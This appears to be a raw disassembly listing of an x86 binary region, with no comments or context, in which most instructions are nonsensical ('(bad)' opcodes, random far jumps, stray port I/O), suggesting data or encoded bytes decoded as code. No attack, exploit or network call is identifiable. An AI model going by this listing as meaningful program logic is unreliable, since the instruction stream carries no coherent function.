  42d465:	add    ecx,DWORD PTR [edx+eax*4+0x4f9c6e1b]
  42d46c:	mov    ebp,0xb7ffc4e4
  42d471:	push   es
  42d472:	mov    ah,BYTE PTR [ecx-0x52]
  42d475:	jmp    0xa1e8:0xda396482
  42d47c:	sbb    al,0x92
  42d47e:	jl     0x42d462
  42d480:	stc    
  42d481:	sub    DWORD PTR [ebx+ebx*8+0x8],edx
  42d485:	xor    dl,BYTE PTR [edi+0x44]
  42d488:	inc    ebp
  42d489:	into   
  42d48a:	mov    edi,0xd0899d2a
  42d48f:	mov    ecx,0xb2e74a4f
  42d494:	lds    ebp,FWORD PTR [ebp+0xf]
  42d497:	lods   al,BYTE PTR ds:[esi]
  42d498:	lock and cl,BYTE PTR [edi-0x32]
  42d49c:	pop    ebx
  42d49d:	push   eax
  42d49e:	push   ds
  42d49f:	adc    BYTE PTR ss:[eax+ecx*8],al
  42d4a3:	rcl    edi,cl
  42d4a5:	and    DWORD PTR [edx],esi
  42d4a7:	mov    ebp,0xe9df5a06
  42d4ac:	jmp    0x42d518
  42d4ae:	shr    BYTE PTR [edi-0x37],0xf9
  42d4b2:	gs leave 
  42d4b4:	lock out dx,al
  42d4b6:	mov    eax,0x4b102dfb
  42d4bb:	int3   
  42d4bc:	dec    ebp
  42d4bd:	add    eax,eax
  42d4bf:	sbb    DWORD PTR [edx],edi
  42d4c1:	push   eax
  42d4c2:	ins    BYTE PTR es:[edi],dx
  42d4c3:	add    DWORD PTR [esi-0x27],eax
  42d4c6:	shl    BYTE PTR [ebp-0x41],0x2a
  42d4ca:	out    dx,al
  42d4cb:	mov    edx,0x4f67e50c
  42d4d0:	mov    esi,0x3e29b5d7
  42d4d5:	xchg   esp,eax
  42d4d6:	(bad)  
  42d4d7:	mov    ecx,0xcdc6543c
  42d4dc:	push   0x47
  42d4de:	cmp    dl,ch
  42d4e0:	imul   ebx,DWORD PTR [edi-0x1038d3fc],0xee66805
  42d4ea:	sbb    BYTE PTR [ebx+0x560f56ca],0xdc
  42d4f1:	xchg   BYTE PTR ds:0x3a95c377,ah
  42d4f7:	mov    bh,0xd1
  42d4f9:	sub    ebp,DWORD PTR [edx+eiz*1+0x47e70a85]
  42d500:	push   esp
  42d501:	retf   0x1fed
  42d504:	jle    0x42d54e
  42d506:	jmp    0x19ec8a5
  42d50b:	sub    BYTE PTR [esi],bh
  42d50d:	or     BYTE PTR [edx+0x45],cl
	...
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x7e8d98d5,eax
  42d583:	dec    esi
  42d584:	sbb    ch,ah
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	popf   
  42d58d:	fadd   DWORD PTR [ecx-0x51]
  42d590:	sbb    esp,ebp
  42d592:	cdq    
  42d593:	mov    eax,ss
  42d595:	fisubr WORD PTR [ebx-0x793a0b77]
  42d59b:	jne    0x42d54d
  42d59d:	xor    DWORD PTR [ebx-0x695be987],ebp
  42d5a3:	cmp    eax,0xef70e75a
  42d5a8:	mov    bh,0x44
  42d5aa:	(bad)  
  42d5ab:	icebp  
  42d5ac:	(bad)  
  42d5ad:	ss jae 0x42d5d2
  42d5b0:	mov    bh,0x67
  42d5b2:	out    0x19,eax
  42d5b4:	jmp    0xd1d7:0xca430c12
  42d5bb:	sbb    ch,BYTE PTR [edi-0x703067e9]
  42d5c1:	leave  
  42d5c2:	int    0xa8
  42d5c4:	lea    ecx,[ebp-0x2eb4278f]
  42d5ca:	ins    DWORD PTR es:[edi],dx
  42d5cb:	repz push edx
  42d5cd:	and    dl,ch
  42d5cf:	xchg   edx,eax
  42d5d0:	loope  0x42d5c5
  42d5d2:	shl    BYTE PTR [edx-0x174ba383],cl
  42d5d8:	ret    
  42d5d9:	push   0x4
  42d5db:	cmp    al,0x2b
  42d5dd:	push   ebp
  42d5de:	push   esp
  42d5df:	jl     0x42d569
  42d5e1:	sbb    eax,0x3493c43a
  42d5e6:	dec    edx
  42d5e7:	test   BYTE PTR [edx],dl
  42d5e9:	ins    DWORD PTR es:[edi],dx
  42d5ea:	addr16 ret 0x8e05
  42d5ee:	mov    ebp,0x40e4a95b
  42d5f3:	and    bh,bl
  42d5f5:	(bad)  
  42d5f6:	(bad)  
  42d5f7:	inc    esi
  42d5f8:	test   al,0x17
  42d5fa:	adc    eax,0x20df113b
  42d5ff:	cli    
  42d600:	mov    esi,0x143faf6
  42d605:	call   0x630566d9
  42d60a:	xchg   esp,eax
  42d60b:	jg     0x42d5bb
  42d60d:	cmp    eax,0x95ff308b
  42d612:	out    0xbc,eax
  42d614:	dec    esp
  42d615:	cld    
  42d616:	mov    ecx,0x4965aa1a
  42d61b:	dec    ecx
  42d61c:	jb     0x42d5cb
  42d61e:	mov    ds:0x832be882,eax
  42d623:	fild   WORD PTR [ebp-0x1980398d]
  42d629:	ret    0xdb37
  42d62c:	mov    esi,0x68cbd423
  42d631:	and    BYTE PTR [ecx],ch
  42d633:	push   ds
  42d634:	and    BYTE PTR ds:0x1146b9d2,ah
  42d63a:	pop    ss
  42d63b:	cmp    dl,BYTE PTR [esi]
  42d63d:	push   eax
  42d63e:	sbb    ch,BYTE PTR [edi]
  42d640:	addr16 pop ecx
  42d642:	test   DWORD PTR [eax+0x2fba733e],edx
  42d648:	(bad)  
  42d649:	jmp    0xecaf:0xf678d327
  42d650:	mov    ebp,0xcfd262ee
  42d655:	(bad)  [eax+0x15]
  42d658:	pusha  
  42d659:	lods   eax,DWORD PTR ds:[esi]
  42d65a:	inc    esi
  42d65b:	ins    BYTE PTR es:[edi],dx
  42d65c:	add    al,BYTE PTR [ecx+edx*8+0x70530a05]
  42d663:	or     cl,BYTE PTR [esi]
  42d665:	push   0xffffffe9
  42d667:	imul   edi,DWORD PTR [edx-0x5058b272],0x21
  42d66e:	xor    ah,BYTE PTR [ebp-0x79]
  42d671:	xchg   ebx,eax
  42d672:	out    dx,eax
  42d673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d675:	fisttp QWORD PTR [eax]
  42d677:	(bad)  [ebx]
  42d679:	stos   DWORD PTR es:[edi],eax
  42d67a:	iret   
  42d67b:	aad    0xd0
  42d67d:	out    dx,eax
  42d67e:	lock mov dh,0xb5
  42d681:	push   ebp
  42d682:	mov    ebx,DWORD PTR ds:0x28f69d5a
  42d688:	mov    ?,WORD PTR [esi+0x1d]
  42d68b:	push   0x594d1513
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x16
  42d701:	pop    ebx
  42d702:	pusha  
  42d703:	inc    ecx
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	stos   BYTE PTR es:[edi],al
  42d70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d70e:	sub    DWORD PTR [ebx-0x300ba57b],edi
  42d714:	sub    esp,eax
  42d716:	in     al,0x91
  42d718:	out    dx,al
  42d719:	dec    esi
  42d71a:	xchg   edx,eax
  42d71b:	or     BYTE PTR [ecx+eax*4],bh
  42d71e:	jg     0x42d6bb
  42d720:	leave  
  42d721:	add    eax,0x54158255
  42d726:	fwait
  42d727:	inc    ebx
  42d728:	add    BYTE PTR [edx+0x7d],dl
  42d72b:	xchg   esi,eax
  42d72c:	or     BYTE PTR [eax-0x44],bl
  42d72f:	aad    0xfb
  42d731:	or     eax,0x6100d0e1
  42d736:	fucomp st(3)
  42d738:	retf   
  42d739:	push   ecx
  42d73a:	(bad)  
  42d73b:	pop    esp
  42d73c:	aas    
  42d73d:	test   al,0x92
  42d73f:	imul   ecx,esi,0x47
  42d742:	inc    esp
  42d743:	shr    BYTE PTR [ebp+0x77],1
  42d746:	sbb    BYTE PTR [ebx-0x62],cl
  42d749:	add    al,BYTE PTR [ebx+0x66]
  42d74c:	mov    al,ds:0x517660b4
  42d751:	xor    dl,bh
  42d753:	xor    dh,cl
  42d755:	pop    es
  42d756:	push   0x5dddb737
  42d75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d75c:	fnstenv [ecx+0x46]
  42d75f:	mov    esp,0x5e3735b7
  42d764:	int    0x49
  42d766:	arpl   dx,dx
  42d768:	xor    ebx,DWORD PTR [ebx+eiz*2-0x5cfa0feb]
  42d76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d770:	pop    DWORD PTR [ecx+0x20]
  42d773:	inc    ebx
  42d774:	setl   BYTE PTR [edi+0x48]
  42d778:	sbb    esi,DWORD PTR [edi]
  42d77a:	jno    0x42d707
  42d77c:	mov    al,0x81
  42d77e:	push   ds
  42d77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d780:	cdq    
  42d781:	in     al,0x11
  42d783:	push   ebp
  42d784:	dec    edi
  42d785:	ror    bh,0x45
  42d788:	ss push esi
  42d78a:	loope  0x42d7d6
  42d78c:	shl    edx,cl
  42d78e:	pop    ebx
  42d78f:	adc    BYTE PTR [esi+0x39],ch
  42d792:	(bad)  
  42d793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d794:	mov    ebp,DWORD PTR [esi]
  42d796:	xor    cl,BYTE PTR ds:0x6618c405
  42d79c:	adc    dl,BYTE PTR [ecx]
  42d79e:	fidivr WORD PTR es:0x728969b4
  42d7a5:	(bad)  
  42d7a6:	aas    
  42d7a7:	iret   
  42d7a8:	mov    eax,0x7b88af29
  42d7ad:	jle    0x42d7ce
  42d7af:	aad    0x0
  42d7b1:	jmp    0x91c2d5cd
  42d7b6:	jp     0x42d75e
  42d7b8:	mov    dh,0x26
  42d7ba:	repz fmul QWORD PTR [edx]
  42d7bd:	xchg   esp,edi
  42d7bf:	clc    
  42d7c0:	sub    eax,0x52eb9e2d
  42d7c5:	imul   esi,DWORD PTR [ebx+0x3d],0x7e77011a
  42d7cc:	pop    es
  42d7cd:	aaa    
  42d7ce:	int    0x53
  42d7d0:	cmp    DWORD PTR [ebx],edi
  42d7d2:	pop    edi
  42d7d3:	lea    edi,[eax-0x41c9d9a6]
  42d7d9:	dec    esi
  42d7da:	cwde   
  42d7db:	sub    DWORD PTR [esi-0x23f87c8c],ecx
  42d7e1:	pop    ss
  42d7e2:	inc    eax
  42d7e3:	fucomi st,st(5)
  42d7e5:	add    esi,DWORD PTR [edi-0x3c]
  42d7e8:	scas   eax,DWORD PTR es:[edi]
  42d7e9:	and    BYTE PTR [eax],bh
  42d7eb:	xchg   ecx,eax
  42d7ec:	mov    esi,0xbf398437
  42d7f1:	outs   dx,DWORD PTR ds:[esi]
  42d7f2:	xor    BYTE PTR [ebp+0x4f150792],bh
  42d7f8:	mov    ds:0x3af76ad2,eax
  42d7fd:	in     al,0x62
  42d7ff:	sar    DWORD PTR [ebx+edx*4],cl
  42d802:	add    BYTE PTR [ecx+0x3f],ah
  42d805:	mov    ss,WORD PTR [ecx+0x48]
  42d808:	popf   
  42d809:	(bad)  
  42d80a:	jp     0x42d80c
  42d80c:	pusha  
  42d80d:	add    eax,DWORD PTR [eax+0xac]
	...
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xe9c6961a
  42d881:	pop    ebp
  42d882:	and    eax,0x1e720b0
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d88e:	jge    0x42d86a
  42d890:	cmp    BYTE PTR [edi],ah
  42d892:	cmp    ebx,0xffffffe5
  42d895:	push   esi
  42d896:	sub    al,0xaf
  42d898:	xchg   dl,cl
  42d89a:	ja     0x42d87f
  42d89c:	mov    cl,0x57
  42d89e:	pop    ebx
  42d89f:	iret   
  42d8a0:	(bad)  
  42d8a1:	xor    al,0xad
  42d8a3:	sub    dl,ah
  42d8a5:	jmp    0x42d8e2
  42d8a7:	(bad)  
  42d8a8:	and    eax,0xa89cec1e
  42d8ad:	imul   BYTE PTR [esi+0x5a959a8f]
  42d8b3:	lods   eax,DWORD PTR ds:[esi]
  42d8b4:	aaa    
  42d8b5:	jb     0x42d860
  42d8b7:	test   ebx,edx
  42d8b9:	nop
  42d8ba:	add    ebp,DWORD PTR [ebp+0x539a2eda]
  42d8c0:	(bad)  
  42d8c1:	dec    ecx
  42d8c2:	mov    ss,WORD PTR [ebx]
  42d8c4:	das    
  42d8c5:	cmp    al,0xca
  42d8c7:	pop    ds
  42d8c8:	bnd ret 
  42d8ca:	mov    ebx,0x7a754606
  42d8cf:	jbe    0x42d8c6
  42d8d1:	lds    eax,FWORD PTR [edi+0x5c]
  42d8d4:	jmp    0x643:0x35e4c7cc
  42d8db:	pop    edx
  42d8dc:	push   cs
  42d8dd:	cmp    al,0x13
  42d8df:	pop    ebx
  42d8e0:	mov    ebp,0x23023b3b
  42d8e5:	scas   eax,DWORD PTR es:[edi]
  42d8e6:	(bad)  [ebx]
  42d8e8:	shl    bh,cl
  42d8ea:	imul   ebx,DWORD PTR [eax],0x1cfbc3b4
  42d8f0:	jnp    0x42d877
  42d8f2:	sahf   
  42d8f3:	inc    ebp
  42d8f4:	adc    DWORD PTR [edx-0x5d],0x54
  42d8f8:	jb     0x42d8f4
  42d8fa:	adc    eax,0x1f1c6215
  42d8ff:	hlt    
  42d900:	jae    0x42d8ac
  42d902:	inc    edi
  42d903:	add    dh,cl
  42d905:	retf   0x8458
  42d908:	rcl    esi,1
  42d90a:	fstp   st(4)
  42d90c:	ret    
  42d90d:	aam    0xf1
  42d90f:	push   ebx
  42d910:	sahf   
  42d911:	sub    BYTE PTR [edx-0x6d],0xaf
  42d915:	push   cs
  42d916:	mov    al,0x40
  42d918:	cmp    DWORD PTR [ebp-0x36fa2a93],ebx
  42d91e:	aaa    
  42d91f:	push   ebx
  42d920:	sbb    eax,0x1b84922d
  42d925:	adc    ah,ch
  42d927:	xchg   BYTE PTR [eax],al
  42d929:	sar    cl,1
  42d92b:	out    0xac,al
  42d92d:	mov    cl,0xb2
  42d92f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d930:	fisub  DWORD PTR [ecx+ecx*2]
  42d933:	pushf  
  42d934:	loopne 0x42d90f
  42d936:	lahf   
  42d937:	into   
  42d938:	pop    DWORD PTR [ebp+0x3eb07f78]
  42d93e:	icebp  
  42d93f:	fstp   st(4)
  42d941:	(bad)  
  42d943:	mov    ds:0xba69f363,al
  42d948:	test   eax,0x6ea405c1
  42d94d:	cmp    BYTE PTR [edi-0x23b3e51],0x61
  42d954:	mov    ds:0x8b0dfd8,al
  42d959:	popf   
  42d95a:	sub    edx,DWORD PTR [ecx-0x24a41edf]
  42d960:	mov    eax,0xa1816ac9
  42d965:	cmp    esp,DWORD PTR [ebp-0x3d]
  42d968:	enter  0xa5d0,0x63
  42d96c:	bound  ecx,QWORD PTR [edi]
  42d96e:	lahf   
  42d96f:	scas   eax,DWORD PTR es:[edi]
  42d970:	jns    0x42d9c6
  42d972:	mov    ?,ebp
  42d974:	aas    
  42d975:	dec    ecx
  42d976:	mov    ebx,0x1ed05859
  42d97b:	mul    DWORD PTR [edi+0xf7236d0]
  42d981:	mov    al,ds:0x1958d0a6
  42d986:	dec    ebp
  42d987:	or     ecx,DWORD PTR [esi]
  42d989:	sub    DWORD PTR [edx-0x4d],ecx
  42d98c:	in     eax,0x6e
  42d98e:	cmp    eax,eax
	...
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	xchg   ecx,eax
  42da01:	and    DWORD PTR [ebx],edi
  42da03:	gs and al,0xe8
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	jl     0x42da3f
  42da0e:	add    eax,0xf9b624e3
  42da13:	repnz sub al,0x3b
  42da16:	(bad)  
  42da17:	inc    edi
  42da18:	pop    ecx
  42da19:	or     al,0xbf
  42da1b:	js     0x42da90
  42da1d:	repz sbb edi,DWORD PTR [eax]
  42da20:	pop    esp
  42da21:	jmp    0x42da60
  42da23:	repz ja 0x42da2b
  42da26:	xor    DWORD PTR [eax],edx
  42da28:	int    0x11
  42da2a:	in     al,dx
  42da2b:	sub    DWORD PTR [eax+0x61c08c31],ebp
  42da31:	icebp  
  42da32:	jmp    0x42d9bb
  42da34:	mov    al,0xf4
  42da36:	imul   eax,DWORD PTR es:[ecx-0x5a],0xb9df45d0
  42da3e:	enter  0xfa20,0xfb
  42da42:	in     eax,dx
  42da43:	mov    eax,0x76b97044
  42da48:	jb     0x42da0f
  42da4a:	push   eax
  42da4b:	neg    BYTE PTR [edx+ebx*2-0x51]
  42da4f:	dec    edi
  42da50:	xor    al,0x9b
  42da52:	mov    esp,0x37af3244
  42da57:	jg     0x42da64
  42da59:	dec    esi
  42da5a:	jno    0x42da3b
  42da5c:	iretw  
  42da5e:	adc    al,0x31
  42da60:	mov    ds:0xb9d67927,al
  42da65:	and    al,0x1f
  42da67:	shl    al,cl
  42da69:	jle    0x42da9a
  42da6b:	int3   
  42da6c:	cdq    
  42da6d:	dec    ecx
  42da6e:	sbb    BYTE PTR cs:[edx+esi*8-0x6],bl
  42da73:	in     al,0x6b
  42da75:	fstp   TBYTE PTR [edx-0xe]
  42da78:	inc    ecx
  42da79:	mov    bh,0x58
  42da7b:	ds sbb edx,0xbbb1abdb
  42da82:	out    dx,eax
  42da83:	inc    ebp
  42da84:	fist   DWORD PTR [edx+0x18b3bbcf]
  42da8a:	sub    ebp,eax
  42da8c:	call   0xdb9afbd2
  42da91:	fdivr  QWORD PTR [ebp-0x64]
  42da94:	jno    0x42dab3
  42da96:	and    eax,0x92672b50
  42da9b:	inc    ebp
  42da9c:	xchg   esp,eax
  42da9d:	enter  0x7f52,0x31
  42daa1:	xor    eax,0xddcd5d7
  42daa6:	loope  0x42da8d
  42daa8:	cdq    
  42daa9:	push   cs
  42daaa:	ds and esp,eax
  42daad:	retf   0xef32
  42dab0:	or     DWORD PTR [eax],eax
  42dab2:	mov    dh,0xb6
  42dab4:	sub    BYTE PTR [edx+0x35d5f265],cl
  42daba:	push   esp
  42dabb:	(bad)  
  42dabc:	aam    0x48
  42dabe:	fs dec ebx
  42dac0:	jecxz  0x42db23
  42dac2:	xor    ah,dl
  42dac4:	lds    ebx,FWORD PTR [eax+0x22]
  42dac7:	popf   
  42dac8:	adc    al,0xcb
  42daca:	scas   eax,DWORD PTR es:[edi]
  42dacb:	add    al,0xfe
  42dacd:	jp     0x42dac8
  42dacf:	pop    ecx
  42dad0:	in     eax,0x19
  42dad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dad3:	stos   DWORD PTR es:[edi],eax
  42dad4:	cmp    DWORD PTR [edx+0x7a5fe297],esi
  42dada:	(bad)  
  42dadb:	pop    esp
  42dadc:	jo     0x42da69
  42dade:	sub    esp,ebx
  42dae0:	cmp    bh,BYTE PTR [esi+0x73]
  42dae3:	loopne 0x42daaa
  42dae5:	push   edi
  42dae6:	fwait
  42dae7:	je     0x42dacc
  42dae9:	addr16 xchg eax,ebp
  42daec:	jecxz  0x42db58
  42daee:	scas   eax,DWORD PTR es:[edi]
  42daef:	jbe    0x42dad3
  42daf1:	push   edx
  42daf2:	sub    DWORD PTR [edx-0x4bbdb8f],esp
  42daf8:	pop    edx
  42daf9:	push   cs
  42dafa:	mov    ebx,0x6c4fd986
  42daff:	call   0xd505e894
  42db04:	inc    esi
  42db05:	sti    
  42db06:	mov    ds:0x392d3c74,eax
  42db0b:	fstp   TBYTE PTR ds:0xca56ad
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbad
  42db81:	pop    edx
  42db82:	pop    ss
  42db83:	das    
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	push   0x23
  42db8e:	mov    bh,0x8e
  42db90:	dec    eax
  42db91:	push   ebx
  42db92:	sub    eax,0xb711f44e
  42db97:	int    0x84
  42db99:	repnz (bad) 
  42db9b:	sbb    dh,BYTE PTR [eax+0x7f]
  42db9e:	sub    ecx,DWORD PTR [edx-0x66993e98]
  42dba4:	bnd jl 0x42db4d
  42dba7:	add    al,0x6e
  42dba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbaa:	cs mov dl,0x5
  42dbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbae:	leave  
  42dbaf:	pop    ecx
  42dbb0:	stos   DWORD PTR es:[edi],eax
  42dbb1:	je     0x42dbd2
  42dbb3:	aad    0xe8
  42dbb5:	sahf   
  42dbb6:	ins    BYTE PTR es:[edi],dx
  42dbb7:	push   ss
  42dbb8:	pushf  
  42dbb9:	loop   0x42dbb0
  42dbbb:	int3   
  42dbbc:	cmp    eax,0x4c6c5c2
  42dbc1:	dec    esp
  42dbc2:	dec    esi
  42dbc3:	cmp    esi,DWORD PTR [ebx-0x3c]
  42dbc6:	sbb    edi,DWORD PTR [edx+0x5d97c7e1]
  42dbcc:	pop    edi
  42dbcd:	enter  0x50a9,0xc4
  42dbd1:	push   eax
  42dbd2:	pop    esi
  42dbd3:	leave  
  42dbd4:	ins    BYTE PTR es:[edi],dx
  42dbd5:	sar    eax,cl
  42dbd7:	lods   al,BYTE PTR ds:[esi]
  42dbd8:	dec    ebx
  42dbd9:	ja     0x42dc4f
  42dbdb:	mov    dh,0x53
  42dbdd:	into   
  42dbde:	xor    DWORD PTR [edx+0x4f],0xffffffcd
  42dbe2:	dec    esp
  42dbe3:	jne    0x42dbaa
  42dbe5:	sub    bh,BYTE PTR [edi-0x1049a826]
  42dbeb:	mov    edi,0x26f51eb4
  42dbf0:	das    
  42dbf1:	push   ebp
  42dbf2:	ins    BYTE PTR es:[edi],dx
  42dbf3:	cmp    eax,0x1055f20f
  42dbf8:	jb     0x42dbdc
  42dbfa:	or     dl,dh
  42dbfc:	or     bp,WORD PTR es:[ecx]
  42dc00:	repnz adc DWORD PTR [ebp+edx*2-0x30],edx
  42dc05:	je     0x42dc85
  42dc07:	push   0xffffffde
  42dc09:	pop    edi
  42dc0a:	add    eax,0x17b06305
  42dc0f:	jb     0x42dbac
  42dc11:	mov    dl,0x89
  42dc13:	add    eax,0x30bab92c
  42dc18:	and    DWORD PTR [edx-0x2f05593a],esp
  42dc1e:	push   esp
  42dc1f:	mov    ah,0x86
  42dc21:	(bad)  
  42dc22:	cld    
  42dc23:	int3   
  42dc24:	inc    edx
  42dc25:	in     al,dx
  42dc26:	ss retf 
  42dc28:	outs   dx,DWORD PTR ds:[esi]
  42dc29:	mov    ebp,0x387e6a75
  42dc2e:	imul   ah
  42dc30:	nop
  42dc31:	mov    cl,0x35
  42dc33:	js     0x42dc00
  42dc35:	neg    bl
  42dc37:	xchg   ebx,eax
  42dc38:	add    DWORD PTR [ecx],esi
  42dc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc3c:	jnp    0x42dcad
  42dc3e:	nop
  42dc3f:	stos   BYTE PTR es:[edi],al
  42dc40:	jno    0x42dbd8
  42dc42:	and    ecx,DWORD PTR [ebx+eax*4-0x1c6e546]
  42dc49:	pop    ds
  42dc4a:	fst    DWORD PTR [ecx-0x639b5acc]
  42dc50:	and    edx,DWORD PTR [ecx]
  42dc52:	not    DWORD PTR [ebp-0x3b3d68f6]
  42dc58:	lock pop ds
  42dc5a:	push   ss
  42dc5b:	pop    ss
  42dc5c:	sbb    esi,DWORD PTR [ecx-0x58]
  42dc5f:	jecxz  0x42dbef
  42dc61:	into   
  42dc62:	pop    ss
  42dc63:	stc    
  42dc64:	add    al,0xd0
  42dc66:	sbb    edx,DWORD PTR [ebp-0x6f989309]
  42dc6c:	pop    edx
  42dc6d:	mov    bh,0xa2
  42dc6f:	xchg   ebx,eax
  42dc70:	or     BYTE PTR [eax+0x4e],cl
  42dc73:	jb     0x42dc2c
  42dc75:	jg     0x42dc6b
  42dc77:	dec    esp
  42dc78:	(bad)  
  42dc79:	sub    DWORD PTR [edx-0x143d816],esi
  42dc7f:	pop    esi
  42dc80:	inc    ebp
  42dc81:	clc    
  42dc82:	mov    bh,0xc4
  42dc84:	xor    eax,0x874a4efb
  42dc89:	jecxz  0x42dc91
  42dc8b:	sar    esp,1
  42dc8d:	dec    ecx
  42dc8e:	lock retf 0x0
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	xor    al,0xc4
  42dd02:	xchg   esp,eax
  42dd03:	ja     0x42dd31
  42dd05:	jmp    0x0:0x1040001
  42dd0c:	imul   edx,DWORD PTR [ecx+0x6],0xffffffdc
  42dd10:	xchg   esi,eax
  42dd11:	and    bl,BYTE PTR [eax]
  42dd13:	inc    ebp
  42dd14:	retf   
  42dd15:	ins    BYTE PTR es:[edi],dx
  42dd16:	and    ah,BYTE PTR [edx+0x78]
  42dd19:	sub    esp,DWORD PTR [edx+0x4b]
  42dd1c:	(bad)  
  42dd1d:	les    ebp,FWORD PTR [edi]
  42dd1f:	add    eax,0xf6aaac16
  42dd24:	(bad)
  42dd28:	add    eax,0x89457351
  42dd2d:	shl    DWORD PTR [esi+0x64693f02],cl
  42dd33:	pop    ebp
  42dd34:	push   DWORD PTR [esi-0x7]
  42dd37:	ja     0x42dcf5
  42dd39:	cld    
  42dd3a:	ins    DWORD PTR es:[edi],dx
  42dd3b:	jno    0x42dd99
  42dd3d:	loope  0x42dd91
  42dd3f:	jmp    0x42dcf7
  42dd41:	fcomp  QWORD PTR [ebp+0x69]
  42dd44:	mov    eax,ds:0x87d0d437
  42dd49:	inc    esi
  42dd4a:	sbb    eax,0x8895cda2
  42dd4f:	retf   0x7b41
  42dd52:	push   esi
  42dd53:	xlat   BYTE PTR ds:[ebx]
  42dd54:	xchg   ebx,eax
  42dd55:	mov    eax,gs:0x2caf9c84
  42dd5b:	mov    esi,0x151180a4
  42dd60:	or     BYTE PTR [edi-0x13bc91a1],dh
  42dd66:	pop    esi
  42dd67:	jae    0x42dddb
  42dd69:	xchg   ecx,eax
  42dd6a:	sbb    esp,0xac06ef3a
  42dd70:	xchg   edi,eax
  42dd71:	push   0x42f0a6d8
  42dd76:	mov    eax,0xa247c08d
  42dd7b:	mov    al,ds:0x391cd234
  42dd80:	mov    eax,ds:0xbd5698fe
  42dd85:	mov    gs,WORD PTR [ebp-0x67bc789b]
  42dd8b:	push   cs
  42dd8c:	mov    gs,WORD PTR [ecx-0x27]
  42dd8f:	ss leave 
  42dd91:	dec    ebp
  42dd92:	fisttp WORD PTR [eax-0x9]
  42dd95:	pop    ebp
  42dd96:	xor    ecx,DWORD PTR [eax-0x25777508]
  42dd9c:	(bad)
  42dd9f:	leave  
  42dda0:	inc    esp
  42dda1:	je     0x42dde1
  42dda3:	sub    DWORD PTR [edi+0x57fd5a02],0x137cc08b
  42ddad:	das    
  42ddae:	xchg   esp,eax
  42ddaf:	push   0x8cbdafc6
  42ddb4:	sti    
  42ddb5:	add    al,0x32
  42ddb7:	mov    dh,0x5a
  42ddb9:	xlat   BYTE PTR ds:[ebx]
  42ddba:	ja     0x42dd44
  42ddbc:	mov    ebx,0xb6c86912
  42ddc1:	fyl2x  
  42ddc3:	mov    ah,0x24
  42ddc5:	call   0xe396:0xb4bc2f05
  42ddcc:	pop    esi
  42ddcd:	test   DWORD PTR [edi+0x16bce9a8],esi
  42ddd3:	lods   eax,DWORD PTR ds:[esi]
  42ddd4:	retf   0x1924
  42ddd7:	std    
  42ddd8:	adc    esp,DWORD PTR [ebp-0x4fe790fc]
  42ddde:	jnp    0x42dd83
  42dde0:	mov    ebp,0xa6587ca9
  42dde5:	add    edx,DWORD PTR [edi]
  42dde7:	scas   eax,DWORD PTR es:[edi]
  42dde8:	or     al,0x6f
  42ddea:	leave  
  42ddeb:	and    ebx,ecx
  42dded:	dec    ebp
  42ddee:	jmp    0x42dde2
  42ddf0:	cdq    
  42ddf1:	dec    edi
  42ddf2:	in     eax,0x23
  42ddf4:	cld    
  42ddf5:	xchg   ebx,eax
  42ddf6:	repz mov al,ds:0xaabd751
  42ddfc:	ins    BYTE PTR es:[edi],dx
  42ddfd:	lds    edi,FWORD PTR [edx-0x4c]
  42de00:	xchg   ebp,eax
  42de01:	adc    BYTE PTR ds:0x2dd7fd4d,dh
  42de07:	and    sp,dx
  42de0a:	fnsave [edi-0x47]
  42de0d:	adc    BYTE PTR [edi+0x6f],al
	...
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
